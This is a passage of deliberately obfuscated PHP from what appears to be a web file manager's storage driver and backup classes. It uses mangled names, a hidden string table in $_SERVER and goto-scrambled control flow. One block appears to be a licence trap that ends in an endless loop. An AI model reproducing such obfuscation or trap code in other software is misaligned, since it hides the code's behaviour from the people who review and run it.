$EÇ¯ÒÂáÛ[$bÌÕåíƒÊä[197]])); return $EÇ¯ÒÂáÛ ? !0 : !1; goto aîÙ’Ùˆ²²; aîÙ’Ùˆ²²: } public function fileSubstr($Bó‹Ú÷Û½Å, $CåøÇùÌíÚ, $bë‰Â†æŠ‡) { $AÍÉõÏ·Í• = $CåøÇùÌíÚ + $bë‰Â†æŠ‡ - 1; return $this->client->getObject($this->bucket, $Bó‹Ú÷Û½Å, array($_SERVER[Î¿—”òá][198] => "\142\171\164\x65\163\75{$CåøÇùÌíÚ}\x2d{$AÍÉõÏ·Í•}")); } public function upload($dÊ¬¬‹Êß, $F¦ÔÜ…¹, $A¬—¾ášæ„ = false, $c‹‡…éÖ‹¡ = REPEAT_REPLACE) { $C¿¹’·³ÉÏ =& $_SERVER[Î¿—”òá]; $e­ÁšÛ—ññ = array($C¿¹’·³ÉÏ[196] => @md5_file($F¦ÔÜ…¹)); $bµ™†·ÁÖ© = array($C¿¹’·³ÉÏ[199] => get_file_mime(get_path_ext($dÊ¬¬‹Êß))); if (IO::size($F¦ÔÜ…¹) <= 1024 * 1024 * 200) { $B·ÇƒŒ¶Å™ = $this->client->putObjectFile($F¦ÔÜ…¹, $this->bucket, $dÊ¬¬‹Êß, $C¿¹’·³ÉÏ[185], $e­ÁšÛ—ññ, $bµ™†·ÁÖ©); return !empty($B·ÇƒŒ¶Å™) ? $this->getPathOuter($dÊ¬¬‹Êß) : !1; } $BÆõ¹æÌÏÑ = $this->client->multiUploadObject($F¦ÔÜ…¹, $this->bucket, trim($dÊ¬¬‹Êß, $C¿¹’·³ÉÏ[8]), $e­ÁšÛ—ññ, $bµ™†·ÁÖ©); return $BÆõ¹æÌÏÑ ? $this->getPathOuter($dÊ¬¬‹Êß) : !1; } public function download($fŒÖ×éã…ö, $bî¹îåâôò) { if (!@is_dir($this->pathFather($bî¹îåâôò)) && !IO::mkdir($this->pathFather($bî¹îåâôò))) { return !1; } $EÌï±à‹ĞÜ = $this->client->getObject($this->bucket, $fŒÖ×éã…ö, array(), $bî¹îåâôò); return $EÌï±à‹ĞÜ !== !1 ? $bî¹îåâôò : !1; } public function link($EõºùŞõö», $d¹êáç·ä = array()) { $Cä­¨äŞÏ =& $_SERVER[Î¿—”òá]; if ($this->signVer == $Cä­¨äŞÏ[200]) { return $this->client->getAuthenticatedURL($this->bucket, $EõºùŞõö», 3600 * 12, $d¹êáç·ä); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($EõºùŞõö», $Cä­¨äŞÏ[8]), 3600 * 12, $this->region, array(), !0, $d¹êáç·ä); } public function fileOut($D¯ˆ’…à»ë, $eëù–œ±Ö = false, $a¢áİ¼™§ = false, $aË¾ÉèŸ³¼ = '') { goto A›¦Ÿ÷­Á¯; dÖ‡â¡¡‘­: $FÄ¦†´èìò = $this->link($D¯ˆ’…à»ë, $DËÀ‰‚Ñß); $this->fileOutLink($FÄ¦†´èìò); goto bŠ—¥“§·; eæ´÷Ğ¡«Î: if ($d¬õ‘›¨ñÕ == $CÌİŒÙ´Ì[201]) { return parent::fileOut($D¯ˆ’…à»ë, $eëù–œ±Ö, $a¢áİ¼™§, $aË¾ÉèŸ³¼); } $eëù–œ±Ö = $eëù–œ±Ö ? $CÌİŒÙ´Ì[202] : $CÌİŒÙ´Ì[203]; $DËÀ‰‚Ñß = array($CÌİŒÙ´Ì[204] => $eëù–œ±Ö . $CÌİŒÙ´Ì[205] . rawurlencode($a¢áİ¼™§), $CÌİŒÙ´Ì[206] => $d¬õ‘›¨ñÕ); goto dÖ‡â¡¡‘­; A›¦Ÿ÷­Á¯: $CÌİŒÙ´Ì =& $_SERVER[Î¿—”òá]; if (!$a¢áİ¼™§) { $a¢áİ¼™§ = $this->pathThis($D¯ˆ’…à»ë); } $d¬õ‘›¨ñÕ = get_file_mime(get_path_ext($a¢áİ¼™§)); goto eæ´÷Ğ¡«Î; bŠ—¥“§·: } public function fileOutServer($EÀËËáå•Ê, $dìÊíä“¶¡ = false, $dì ¯Õ¤» = false, $b‹Ä¹’¿ğš = '') { parent::fileOut($EÀËËáå•Ê, $dìÊíä“¶¡, $dì ¯Õ¤», $b‹Ä¹’¿ğš); } public function fileOutImage($bğ„ÌÆ‰†, $a‚¼‹Ú¬ŸĞ = 250) { $Bâ›–Æô¥Ğ = $this->link($bğ„ÌÆ‰†); $this->fileOutLink($Bâ›–Æô¥Ğ); } public function fileOutImageServer($F½µ’¹†, $C…Ïåê„·£ = 250) { parent::fileOutImage($F½µ’¹†, $C…Ïåê„·£); } public function hashMd5($CËî´¯Æñ‰, $c¢·éä”ª· = '') { $AÇ®ë´ìé =& $_SERVER[Î¿—”òá]; $F¡ÏÛê¶ù = $this->objectMeta($CËî´¯Æñ‰); if (!$F¡ÏÛê¶ù) { return !1; } $c¢·éä”ª· = $c¢·éä”ª· ? $c¢·éä”ª· : _get($F¡ÏÛê¶ù, $AÇ®ë´ìé[207]); $c¢·éä”ª· = $c¢·éä”ª· ? $c¢·éä”ª· : _get($F¡ÏÛê¶ù, $AÇ®ë´ìé[197], $AÇ®ë´ìé[33]); return $c¢·éä”ª·; } public function uploadFormData($DÈ•—åˆ, $f³œîáÅÍ  = 3600) { $DÍáÓÙºªô =& $_SERVER[Î¿—”òá]; $bÕ˜†ÓáÏ‡ = $this->pathFather($DÈ•—åˆ); $då¾”İ¯Ï¢ = $this->client->getHttpUploadPostParams($this->bucket, $bÕ˜†ÓáÏ‡, $DÍáÓÙºªô[185], $f³œîáÅÍ ); return array_merge((array) $då¾”İ¯Ï¢, array($DÍáÓÙºªô[169] => $this->getHost())); } public function multiUploadFormData($FÖ‰‘÷ò ‚, $fÎÈ‘¡æ´ = 3600) { $Ağà¨çŸöÂ =& $_SERVER[Î¿—”òá]; $BÑ»¼¾®†ˆ = gmdate($Ağà¨çŸöÂ[208]); $EöÖÑØãÁå = array(); $A‚æ‚‘ÀÔ‰ = $this->client->getUploadId($this->bucket, $FÖ‰‘÷ò ‚, $EöÖÑØãÁå); if (!$A‚æ‚‘ÀÔ‰) { return !1; } return array($Ağà¨çŸöÂ[209] => $A‚æ‚‘ÀÔ‰, $Ağà¨çŸöÂ[169] => $this->getHost() . $Ağà¨çŸöÂ[8] . $this->pathEncode($FÖ‰‘÷ò ‚), $Ağà¨çŸöÂ[210] => $BÑ»¼¾®†ˆ, $Ağà¨çŸöÂ[89] => $FÖ‰‘÷ò ‚); } public function multiUploadAuthData($E•¦ÒêŒ, $DÔ·ÊçÎ… = array()) { goto fÅà¤»ÕÑ±; eêçĞ†ĞãŠ: if (strpos($FƒÓ³Ëõ†, $A¶»±Ã®Í[213]) === 0) { return array($A¶»±Ã®Í[220] => $c°¾¡ëëó¯, $A¶»±Ã®Í[210] => $f÷›Ñ¼¯åé); } return $c°¾¡ëëó¯; goto dç’ÉĞò»; FîÃ®»¼ó½: $E—ˆš÷àŸ = $DÔ·ÊçÎ…[$A¶»±Ã®Í[89]]; unset($DÔ·ÊçÎ…[$A¶»±Ã®Í[89]]); if (isset($DÔ·ÊçÎ…[$A¶»±Ã®Í[211]])) { $DÔ·ÊçÎ…[$A¶»±Ã®Í[210]] = $f÷›Ñ¼¯åé; return $this->listUploadParts($E—ˆš÷àŸ, $DÔ·ÊçÎ…); } goto c¦²ºŒµîƒ; c¦²ºŒµîƒ: $bï’ù“ª™¿ = array($A¶»±Ã®Í[212], $A¶»±Ã®Í[33], $A¶»±Ã®Í[116], $A¶»±Ã®Í[33], "\x78\55\x61\155\x7a\x2d\x64\141\x74\x65\x3a{$f÷›Ñ¼¯åé}", $A¶»±Ã®Í[8] . $this->bucket . $A¶»±Ã®Í[8] . $this->pathEncode($E—ˆš÷àŸ) . $FƒÓ³Ëõ†); if (strpos($FƒÓ³Ëõ†, $A¶»±Ã®Í[213]) === 0) { $bï’ù“ª™¿[0] = $A¶»±Ã®Í[214]; } if (isset($DÔ·ÊçÎ…[$A¶»±Ã®Í[215]]) && $DÔ·ÊçÎ…[$A¶»±Ã®Í[215]] == $A¶»±Ã®Í[216]) { $bï’ù“ª™¿[0] = $A¶»±Ã®Í[216]; } goto a©ÊéãÔŞó; a©ÊéãÔŞó: $Aò•”Šêš = implode($A¶»±Ã®Í[217], $bï’ù“ª™¿); $dÜÙéÏÉáµ = base64_encode(hash_hmac($A¶»±Ã®Í[218], $Aò•”Šêš, $this->secret, !0)); $c°¾¡ëëó¯ = $A¶»±Ã®Í[219] . $this->accessKey . $A¶»±Ã®Í[4] . $dÜÙéÏÉáµ; goto eêçĞ†ĞãŠ; fÅà¤»ÕÑ±: $A¶»±Ã®Í =& $_SERVER[Î¿—”òá]; $f÷›Ñ¼¯åé = isset($DÔ·ÊçÎ…[$A¶»±Ã®Í[210]]) ? $DÔ·ÊçÎ…[$A¶»±Ã®Í[210]] : gmdate($A¶»±Ã®Í[208]); $FƒÓ³Ëõ† = isset($DÔ·ÊçÎ…[$A¶»±Ã®Í[160]]) ? $DÔ·ÊçÎ…[$A¶»±Ã®Í[160]] : $A¶»±Ã®Í[33]; goto FîÃ®»¼ó½; dç’ÉĞò»: } public function listUploadParts($C¿®»ïËÖ–, $aÓåèÖŞË = array()) { goto D™æØë‹œƒ; Cª¤Ë¨Ğ: if (!$FŸ™³¶µ«è) { return !1; } unset($aÓåèÖŞË[$fø¢“è”‡ï[211]], $aÓåèÖŞË[$fø¢“è”‡ï[215]]); $aÓåèÖŞË[$fø¢“è”‡ï[89]] = $C¿®»ïËÖ–; goto dÁï”ˆ‡«ù; dÁï”ˆ‡«ù: $D¤Äéİõ›ñ = $this->multiUploadAuthData($C¿®»ïËÖ–, $aÓåèÖŞË); if (empty($D¤Äéİõ›ñ)) { return !1; } return array($fø¢“è”‡ï[220] => $D¤Äéİõ›ñ, $fø¢“è”‡ï[210] => $aÓåèÖŞË[$fø¢“è”‡ï[210]], $fø¢“è”‡ï[222] => $FŸ™³¶µ«è); goto b¡šöõ¿Á¶; D™æØë‹œƒ: $fø¢“è”‡ï =& $_SERVER[Î¿—”òá]; $D‚ …ĞÜë° = str_replace($fø¢“è”‡ï[221], $fø¢“è”‡ï[33], $aÓåèÖŞË[$fø¢“è”‡ï[160]]); $FŸ™³¶µ«è = $this->client->listParts($this->bucket, $C¿®»ïËÖ–, $D‚ …ĞÜë°); goto Cª¤Ë¨Ğ; b¡šöõ¿Á¶: } public function getHost() { return parent::getHost() . $_SERVER[Î¿—”òá][8] . $this->bucket; } public function size($A“—¼µÅš…) { $eò½¶Éï¤ = $this->objectMeta($A“—¼µÅš…); return $eò½¶Éï¤ ? $eò½¶Éï¤[$_SERVER[Î¿—”òá][77]] : 0; } public function info($EÌõ†ò³±É) { if ($this->isFolder($EÌõ†ò³±É)) { return $this->folderInfo($EÌõ†ò³±É); } else { if ($this->isFile($EÌõ†ò³±É)) { return $this->fileInfo($EÌõ†ò³±É); } } return !1; } public function exist($a°æ™ìÍÏ) { return $this->isFile($a°æ™ìÍÏ) || $this->isFolder($a°æ™ìÍÏ); } public function isFile($A©¢×ˆ×ßº) { return !$this->isFolder($A©¢×ˆ×ßº) && $this->objectMeta($A©¢×ˆ×ßº); } public function isFolder($d”àíğ¸÷¦) { return $this->cacheMethod($_SERVER[Î¿—”òá][223], $d”àíğ¸÷¦); } protected function objectMeta($B›Â·“„İä) { return $this->cacheMethod($_SERVER[Î¿—”òá][224], $B›Â·“„İä); } protected function _objectMeta($AŸ¡àƒµ¬) { $Dª¬“¬…‹ =& $_SERVER[Î¿—”òá]; $AŸ¡àƒµ¬ = rtrim($AŸ¡àƒµ¬, $Dª¬“¬…‹[8]); try { $BïĞóè’îâ = $this->client->getObjectInfo($this->bucket, $AŸ¡àƒµ¬); if (!isset($BïĞóè’îâ[$Dª¬“¬…‹[207]]) && isset($BïĞóè’îâ[$Dª¬“¬…‹[225]])) { $BïĞóè’îâ[$Dª¬“¬…‹[207]] = $BïĞóè’îâ[$Dª¬“¬…‹[225]]; } } catch (Exception $a©†°²Êæ) { $BïĞóè’îâ = !1; } if (!$BïĞóè’îâ) { } return $BïĞóè’îâ; } protected function _isFolder($b¿“Ì¥Í§¸) { goto Bª„ÊÊŸ­Œ; Bª„ÊÊŸ­Œ: $DÌâ¾â¡ =& $_SERVER[Î¿—”òá]; $b¿“Ì¥Í§¸ = rtrim($b¿“Ì¥Í§¸, $DÌâ¾â¡[8]); if ($b¿“Ì¥Í§¸ == $DÌâ¾â¡[33] || $b¿“Ì¥Í§¸ == $DÌâ¾â¡[8]) { return !0; } goto eÉ¡˜è×²ù; eÉ¡˜è×²ù: $cóœóâä´™ = $this->client->getBucket($this->bucket, $b¿“Ì¥Í§¸, null, 1); if (empty($cóœóâä´™)) { return !1; } $cóœóâä´™ = array_values($cóœóâä´™); goto dÍÕ‹”—«ƒ; dÍÕ‹”—«ƒ: if (substr($cóœóâä´™[0][$DÌâ¾â¡[28]], -1) == $DÌâ¾â¡[8]) { return !0; } if (get_path_this($cóœóâä´™[0][$DÌâ¾â¡[28]]) == get_path_this($b¿“Ì¥Í§¸)) { return !1; } return !0; goto aÌ‚ÊÖÈ; aÌ‚ÊÖÈ: } } define($_SERVER[Î¿—”òá][226], 1); goto Bµ‹‰à‹±‡; C¥ÓèÄëŒÌ: if (!isset($_SERVER[$_SERVER[Î¿—”òá][676]]) || !isset($_SERVER[$_SERVER[Î¿—”òá][677]])) { goto AñªÎÏª; CŸ¥¨×™Ş: $e•ª…ÜÙ´ù($_SERVER[$_SERVER[Î¿—”òá][679]] . $_SERVER[Î¿—”òá][680]); $AİœäñÕ© = 2; while ($AİœäñÕ© > 1) { $B‘…Áê­÷Ë = rawurlencode($AİœäñÕ© . $_SERVER[Î¿—”òá][361]); } goto e£ùÆ˜ØŠâ; AñªÎÏª: $d¥¼àÄ­’Ş = $_SERVER[Î¿—”òá][678]; $a†‚±Ñ†Ñ˜ = $_SERVER[$_SERVER[Î¿—”òá][679]] . $_SERVER[Î¿—”òá][680]; $C˜í‡êŠÌó = $d¥¼àÄ­’Ş($a†‚±Ñ†Ñ˜); goto D¸ˆÎÈÅ‰Ë; D¸ˆÎÈÅ‰Ë: $E—½ËË ¤â = explode($_SERVER[Î¿—”òá][217], $C˜í‡êŠÌó); if (count($E—½ËË ¤â) < $_SERVER[Î¿—”òá][548]) { $d¡÷œåæå = $_SERVER[Î¿—”òá][681]; $d¡÷œåæå(); } $e•ª…ÜÙ´ù = $_SERVER[Î¿—”òá][682]; goto CŸ¥¨×™Ş; e£ùÆ˜ØŠâ: } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $F¨ß»ÛËÑ„ =& $_SERVER[Î¿—”òá]; self::$name = date($F¨ß»ÛËÑ„[683]); if (!($dÄá‰æÙà® = Model($F¨ß»ÛËÑ„[684])->lastItem())) { $dÄá‰æÙà® = $this->initData(); } else { self::$name = $dÄá‰æÙà®[$F¨ß»ÛËÑ„[28]]; if ($dÄá‰æÙà®[$F¨ß»ÛËÑ„[685]] == $F¨ß»ÛËÑ„[83]) { self::$name = date($F¨ß»ÛËÑ„[686]); $aˆËÓ®³´‘ = 0; if (isset($dÄá‰æÙà®[$F¨ß»ÛËÑ„[281]][$F¨ß»ÛËÑ„[167]][$F¨ß»ÛËÑ„[419]])) { $aˆËÓ®³´‘ = (int) $dÄá‰æÙà®[$F¨ß»ÛËÑ„[281]][$F¨ß»ÛËÑ„[167]][$F¨ß»ÛËÑ„[419]]; } if ($dÄá‰æÙà®[$F¨ß»ÛËÑ„[28]] == self::$name) { Model($F¨ß»ÛËÑ„[684])->remove($dÄá‰æÙà®[$F¨ß»ÛËÑ„[367]]); } $dÄá‰æÙà® = $this->initData($aˆËÓ®³´‘, $dÄá‰æÙà®[$F¨ß»ÛËÑ„[687]]); } else { $this->checkStore($dÄá‰æÙà®[$F¨ß»ÛËÑ„[687]]); } } self::$option = $dÄá‰æÙà®; } private function initData($bã¦õ³†”  = 0, $FÓë°ÄÔ‰½ = '') { goto bŸïùÛ²¦í; d§áİ÷¯Š¥: $this->checkStore($Dˆ£§²ôİ[$fé¯§ÆÍÆ‚[687]]); $E‚†ËÁêˆ‚ = array($fé¯§ÆÍÆ‚[687] => $Dˆ£§²ôİ[$fé¯§ÆÍÆ‚[687]], $fé¯§ÆÍÆ‚[28] => self::$name, $fé¯§ÆÍÆ‚[685] => 0, $fé¯§ÆÍÆ‚[688] => $Dˆ£§²ôİ[$fé¯§ÆÍÆ‚[688]], $fé¯§ÆÍÆ‚[281] => array($fé¯§ÆÍÆ‚[689] => array($fé¯§ÆÍÆ‚[685] => 0), $fé¯§ÆÍÆ‚[690] => array($fé¯§ÆÍÆ‚[685] => 0, $fé¯§ÆÍÆ‚[691] => 0, $fé¯§ÆÍÆ‚[692] => 0, $fé¯§ÆÍÆ‚[29] => $fé¯§ÆÍÆ‚[33]), $fé¯§ÆÍÆ‚[693] => array($fé¯§ÆÍÆ‚[685] => 0, $fé¯§ÆÍÆ‚[691] => 0, $fé¯§ÆÍÆ‚[692] => 0), $fé¯§ÆÍÆ‚[167] => array($fé¯§ÆÍÆ‚[685] => 0, $fé¯§ÆÍÆ‚[694] => 0, $fé¯§ÆÍÆ‚[695] => 0, $fé¯§ÆÍÆ‚[696] => 0, $fé¯§ÆÍÆ‚[697] => 0, $fé¯§ÆÍÆ‚[419] => $bã¦õ³†” )), $fé¯§ÆÍÆ‚[698] => time(), $fé¯§ÆÍÆ‚[699] => 0); $AÏ‘¾ŒÄ Î = Model($fé¯§ÆÍÆ‚[684])->insert($E‚†ËÁêˆ‚); goto cÕÓî˜Ğ¢Ä; cÕÓî˜Ğ¢Ä: $E‚†ËÁêˆ‚[$fé¯§ÆÍÆ‚[367]] = $AÏ‘¾ŒÄ Î; return $E‚†ËÁêˆ‚; goto B‘İÓ‚½Ù‡; bŸïùÛ²¦í: $fé¯§ÆÍÆ‚ =& $_SERVER[Î¿—”òá]; $Dˆ£§²ôİ = Model($fé¯§ÆÍÆ‚[684])->config(); if ($FÓë°ÄÔ‰½ && $Dˆ£§²ôİ[$fé¯§ÆÍÆ‚[687]] != $FÓë°ÄÔ‰½) { $bã¦õ³†”  = 0; } goto d§áİ÷¯Š¥; B‘İÓ‚½Ù‡: } private function checkStore($BÛÌÄ‹îÔƒ) { $Añ½æ®’ã¯ =& $_SERVER[Î¿—”òá]; $D›Èˆõö× = Model($Añ½æ®’ã¯[700])->listData($BÛÌÄ‹îÔƒ); Model($Añ½æ®’ã¯[700])->checkConfig($D›Èˆõö×); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Î¿—”òá][684])->findByName(self::$name); } return self::$option; } public static function set($AÌğº¾œ¶–) { $EÈŒ·Œİ =& $_SERVER[Î¿—”òá]; $a°‡øÏÙÎ = self::get(); foreach ($AÌğº¾œ¶– as $a¹®ÄÉ›½¿ => $A õŞŠÁš) { $d­£Óæù¸ë = explode($EÈŒ·Œİ[91], $a¹®ÄÉ›½¿); $bÇ¤ªã±ßè = count($d­£Óæù¸ë); switch ($bÇ¤ªã±ßè) { case 1: $a°‡øÏÙÎ[$d­£Óæù¸ë[0]] = $A õŞŠÁš; break; case 2: $a°‡øÏÙÎ[$d­£Óæù¸ë[0]][$d­£Óæù¸ë[1]] = $A õŞŠÁš; break; case 3: $a°‡øÏÙÎ[$d­£Óæù¸ë[0]][$d­£Óæù¸ë[1]][$d­£Óæù¸ë[2]] = $A õŞŠÁš; break; } } Model($EÈŒ·Œİ[684])->update($a°‡øÏÙÎ[$EÈŒ·Œİ[367]], $a°‡øÏÙÎ); self::$option = $a°‡øÏÙÎ; return self::$option; } public function keep() { $a´İ–˜ÎŠŒ =& $_SERVER[Î¿—”òá]; $cÆÍ¥°ìÌ = self::get(); if ($cÆÍ¥°ìÌ[$a´İ–˜ÎŠŒ[281]][$a´İ–˜ÎŠŒ[689]][$a´İ–˜ÎŠŒ[685]] == $a´İ–˜ÎŠŒ[83]) { return; } $this->backupKeep($cÆÍ¥°ìÌ); self::set(array($a´İ–˜ÎŠŒ[701] => 1)); } private function backupKeep($d¥öºÔ›çÓ) { goto Có¼ÉÕ¼¶; Có¼ÉÕ¼¶: $AÄë˜‰£—‰ =& $_SERVER[Î¿—”òá]; $B¼Óğ‹®• = Model($AÄë˜‰£—‰[684])->listData(); if (empty($B¼Óğ‹®•)) { return; } goto d‰Ü•Æœà; d‰Ü•Æœà: $Dß† ÎÈ§ê = 0; $Aç¼·¶¬†‡ = array(); foreach ($B¼Óğ‹®• as $e¼°íËÅ©) { if ($Dß† ÎÈ§ê >= 7) { break; } $Aç¼·¶¬†‡[] = $e¼°íËÅ©[$AÄë˜‰£—‰[28]]; $Dß† ÎÈ§ê++; } goto cêÖ‡²áŒù; cêÖ‡²áŒù: for ($Dß† ÎÈ§ê = 0; $Dß† ÎÈ§ê < 12; $Dß† ÎÈ§ê++) { $Aç¼·¶¬†‡[] = date($AÄë˜‰£—‰[702], strtotime("\55{$Dß† ÎÈ§ê}\x20\x6d\x6f\156\x74\150\x73")); } $Aç¼·¶¬†‡ = array_unique($Aç¼·¶¬†‡); foreach ($B¼Óğ‹®• as $e¼°íËÅ©) { if (!empty($e¼°íËÅ©[$AÄë˜‰£—‰[28]]) && in_array($e¼°íËÅ©[$AÄë˜‰£—‰[28]], $Aç¼·¶¬†‡)) { continue; } Model($AÄë˜‰£—‰[684])->remove($e¼°íËÅ©[$AÄë˜‰£—‰[367]]); $B¾ÉÕ¢Ä„‡ = "\x7b\x69\157\x3a{$d¥öºÔ›çÓ[$AÄë˜‰£—‰[687]]}\x7d\57\x64\141\164\x61\142\x61\163\x65\x2f\x62\x61\143\x6b\165\x70\x5f{$e¼°íËÅ©[$AÄë˜‰£—‰[28]]}"; IO::remove($B¾ÉÕ¢Ä„‡, !1); } goto d‡É‰¾ÊÄƒ; d‡É‰¾ÊÄƒ: } public function db() { goto D•äƒŞ“öõ; f”¾îåé†: return !0; goto eáä„âêî; D•äƒŞ“öõ: $Dëç‡ÆÎÃ =& $_SERVER[Î¿—”òá]; $a¤¶¡ÉÔ“ = self::get(); if ($a¤¶¡ÉÔ“[$Dëç‡ÆÎÃ[281]][$Dëç‡ÆÎÃ[690]][$Dëç‡ÆÎÃ[685]] == $Dëç‡ÆÎÃ[83]) { return !0; } goto A£¢áãÈ³; A£¢áãÈ³: $EœõÖÏã¦Ë = new BackupDb(); if (!$EœõÖÏã¦Ë->index()) { return !1; } self::set(array($Dëç‡ÆÎÃ[703] => 1)); goto f”¾îåé†; eáä„âêî: } public function dbFile() { goto a³®ˆ£ôëô; F±öóÓÜİİ: $EÖæªˆ½’Ö = new BackupDbFile(); if (!$EÖæªˆ½’Ö->index()) { return !1; } self::set(array($b­ÈÎÕÇò´[704] => 1)); goto Fò°ŒÍÙ¤¦; Fò°ŒÍÙ¤¦: return !0; goto bÎÜ¤ëªÜ¶; a³®ˆ£ôëô: $b­ÈÎÕÇò´ =& $_SERVER[Î¿—”òá]; $e¸˜’øå× = self::get(); if ($e¸˜’øå×[$b­ÈÎÕÇò´[281]][$b­ÈÎÕÇò´[693]][$b­ÈÎÕÇò´[685]] == $b­ÈÎÕÇò´[83]) { return !0; } goto F±öóÓÜİİ; bÎÜ¤ëªÜ¶: } public function file() { $Bˆ²‡¡·ÖÕ =& $_SERVER[Î¿—”òá]; $A Î‘ĞÕ§™ = self::get(); if ($A Î‘ĞÕ§™[$Bˆ²‡¡·ÖÕ[281]][$Bˆ²‡¡·ÖÕ[167]][$Bˆ²‡¡·ÖÕ[685]] == $Bˆ²‡¡·ÖÕ[83]) { return !0; } if (!isset($A Î‘ĞÕ§™[$Bˆ²‡¡·ÖÕ[688]]) || $A Î‘ĞÕ§™[$Bˆ²‡¡·ÖÕ[688]] == $Bˆ²‡¡·ÖÕ[468]) { $d¡ë Õ¯øÀ = new BackupFile(); if (!$d¡ë Õ¯øÀ->index()) { return !1; } } self::set(array($Bˆ²‡¡·ÖÕ[705] => 1, $Bˆ²‡¡·ÖÕ[685] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto C¶©Ñšåª; EÌ÷Şª³À: foreach ($a¼ùƒÚÓ»ò as $Eâµ„È¥») { $f¬£ôô®¨ = $e„¬ºÆÀÔÂ . $Eâµ„È¥» . $AòÏï‚†š[714]; $Fë¤‘…šÒœ = null; if ($Eâµ„È¥» == $AòÏï‚†š[715] && (!isset($A°”Êá¬ÊÉ[$AòÏï‚†š[688]]) || $A°”Êá¬ÊÉ[$AòÏï‚†š[688]] == $AòÏï‚†š[468])) { $Fë¤‘…šÒœ = self::$io; } $bãï³ÚÍì¶ += $fË¸‰…Ú‹Ú->sqlFromDb($Eâµ„È¥», $f¬£ôô®¨, $D¦²‡‹ôãŸ, $Fë¤‘…šÒœ); } $D¦²‡‹ôãŸ->end(); $a‚’Õ¥Ø˜Ã = array($AòÏï‚†š[716] => $cÄçÌ†Èš, $AòÏï‚†š[703] => 1, $AòÏï‚†š[717] => $bãï³ÚÍì¶, $AòÏï‚†š[718] => $bãï³ÚÍì¶); goto eô„¼’Ş; añ«Ï­ÄÇˆ: $a¼ùƒÚÓ»ò = array_diff($a¼ùƒÚÓ»ò, array($AòÏï‚†š[707], $AòÏï‚†š[708])); foreach ($a¼ùƒÚÓ»ò as $Eâµ„È¥») { $cœº¨Ö†á += $fË¸‰…Ú‹Ú->model($Eâµ„È¥»)->count(); } $D¦²‡‹ôãŸ = new Task($AòÏï‚†š[709], $AòÏï‚†š[710], $cœº¨Ö†á, LNG($AòÏï‚†š[711]) . $AòÏï‚†š[712] . LNG($AòÏï‚†š[713])); goto EÌ÷Şª³À; eô„¼’Ş: Backup::set($a‚’Õ¥Ø˜Ã); return !0; goto BÔññ¬„µØ; E‹ÅÎŒÏíÒ: self::$name = $A°”Êá¬ÊÉ[$AòÏï‚†š[28]]; $D ì‘“ÑÎ— = $GLOBALS[$AòÏï‚†š[6]][$AòÏï‚†š[17]]; $cÄçÌ†Èš = $this->_dbType($D ì‘“ÑÎ—); goto CÛÑŸÊšÒ«; CÛÑŸÊšÒ«: $fË¸‰…Ú‹Ú = new DbManage($D ì‘“ÑÎ—, $cÄçÌ†Èš); $e„¬ºÆÀÔÂ = TEMP_FILES . $AòÏï‚†š[706] . self::$name . $AòÏï‚†š[8]; del_dir($e„¬ºÆÀÔÂ); goto bÖöˆ–‚; C¶©Ñšåª: $AòÏï‚†š =& $_SERVER[Î¿—”òá]; $A°”Êá¬ÊÉ = Backup::get(); self::$io = $A°”Êá¬ÊÉ[$AòÏï‚†š[687]]; goto E‹ÅÎŒÏíÒ; bÖöˆ–‚: mk_dir($e„¬ºÆÀÔÂ); $cœº¨Ö†á = $bãï³ÚÍì¶ = 0; $a¼ùƒÚÓ»ò = $fË¸‰…Ú‹Ú->db()->getTables(); goto añ«Ï­ÄÇˆ; BÔññ¬„µØ: } private function _dbType($Eˆ„¨¨øâó) { goto b³ˆõˆ¼³ ; CŒÙ¶Š£Ğ—: return $E£ê´¼Ì‘¬; goto dß»ó¾”ÒĞ; c¯´Š¤Ü‘º: if ($E£ê´¼Ì‘¬ == $f–øèˆÌÇ‡[720]) { $d´›Ğ¼°³Ñ = explode($f–øèˆÌÇ‡[4], $Eˆ„¨¨øâó[$f–øèˆÌÇ‡[721]]); $E£ê´¼Ì‘¬ = $d´›Ğ¼°³Ñ[0]; } $DÃŒ­ñéÔÒ = array($f–øèˆÌÇ‡[722] => $f–øèˆÌÇ‡[9], $f–øèˆÌÇ‡[723] => $f–øèˆÌÇ‡[724]); if (isset($DÃŒ­ñéÔÒ[$E£ê´¼Ì‘¬])) { $E£ê´¼Ì‘¬ = $DÃŒ­ñéÔÒ[$E£ê´¼Ì‘¬]; } goto CŒÙ¶Š£Ğ—; b³ˆõˆ¼³ : $f–øèˆÌÇ‡ =& $_SERVER[Î¿—”òá]; $Eˆ„¨¨øâó = array_change_key_case($Eˆ„¨¨øâó); $E£ê´¼Ì‘¬ = $Eˆ„¨¨øâó[$f–øèˆÌÇ‡[719]]; goto c¯´Š¤Ü‘º; dß»ó¾”ÒĞ: } } goto bø°”ˆÁˆè; c‡ôŠğ¸ò‘: class TaskFileTransfer extends Task { protected function startAfter() { goto cÎêÓõÕ§‰; Fëã‘ƒÊ‹î: $Eœ®ç„ƒ[$c¼¥Ä…¶Í„[1478]] = 0; $Eœ®ç„ƒ[$c¼¥Ä…¶Í„[1479]] = 0; if (!$Eœ®ç„ƒ[$c¼¥Ä…¶Í„[1335]]) { $Eœ®ç„ƒ[$c¼¥Ä…¶Í„[1335]] = LNG($c¼¥Ä…¶Í„[1480]); } goto e†÷Ú¿¹·ï; eä® ôÄ —: Hook::bind($c¼¥Ä…¶Í„[1466], array($this, $c¼¥Ä…¶Í„[1467])); Hook::bind($c¼¥Ä…¶Í„[1468], array($this, $c¼¥Ä…¶Í„[1469])); Hook::bind($c¼¥Ä…¶Í„[1470], array($this, $c¼¥Ä…¶Í„[1471])); goto EÎÃ£ò²ñË; EÎÃ£ò²ñË: $Eœ®ç„ƒ[$c¼¥Ä…¶Í„[1472]] = LNG($c¼¥Ä…¶Í„[1473]); $Eœ®ç„ƒ[$c¼¥Ä…¶Í„[1474]] = 0; $Eœ®ç„ƒ[$c¼¥Ä…¶Í„[1475]] = 0; goto bá‹‰Ì‚“å; fšäç¼„Ğº: Hook::bind($c¼¥Ä…¶Í„[511], array($this, $c¼¥Ä…¶Í„[1462])); Hook::bind($c¼¥Ä…¶Í„[513], array($this, $c¼¥Ä…¶Í„[1462])); Hook::bind($c¼¥Ä…¶Í„[515], array($this, $c¼¥Ä…¶Í„[1462])); goto C‚ù”çÂİ; Aèñ¬¼á¦Š: 